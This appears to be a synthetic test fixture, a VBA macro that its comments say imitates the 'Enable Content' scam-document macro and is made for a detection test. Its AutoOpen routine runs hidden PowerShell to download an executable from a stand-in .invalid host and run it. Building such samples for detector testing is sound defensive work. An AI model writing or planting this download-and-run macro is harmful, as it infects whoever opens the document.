' SYNTHETIC TEST INPUT for the Day-1 Inspect test. Not runnable as-is: the URL uses the reserved .invalid domain.
' This imitates the VBA macro found in "Enable Content to view your offer" scam documents.
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -w hidden -c ""iwr http://offer-docs.invalid/view.exe -OutFile $env:TEMP\view.exe; Start-Process $env:TEMP\view.exe""", 0
End Sub
